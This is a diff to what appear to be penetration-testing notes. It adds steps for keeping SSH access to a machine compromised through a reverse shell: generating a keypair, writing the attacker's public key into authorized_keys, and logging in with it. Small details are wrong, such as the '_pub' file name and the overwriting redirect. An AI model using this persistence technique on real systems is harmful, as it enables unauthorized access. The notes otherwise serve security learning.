@@ -24,14 +24,28 @@ If you manage to upload a reverse-shell and get access to the machine you might 
 So, in the /home/user dir you can find the hidden `.ssh` files by typing `ls -la`.
 Then you need to do two things.
 
-1. Copy the private key.
-2. Add your own key *public key* to authorized hosts. Of course, this is not very good for your opsec. 
+1. Create a new keypair.
+You do that with: `ssh-keygen -t rsa -C "your_email@example.com"` then you enter a name for the key.
 
-Wget
+Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: `
 
-server
+This will create two files, one called *nameOfMyKey* and another called *nameOfMyKey_pub*. The one with the *_pub* is of course your public key. And the other key is your private.
+
+2. Add your public key to authorized_keys.
+Now you copy the content of *nameOfMyKey_pub*. 
+On the compromised machine you go to `~/.ssh` and then run add the public key to the file authorized_keys. Like this `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv..." > authorized_keys`
+
+3. Log in.
+Now you should be all set to log in using your private key. Like this
+
+`ssh -i nameOfMyKey kim@192.168.1.103`
 
 
+### Wget
 
-ftp
+###server
+
+###ftp
 
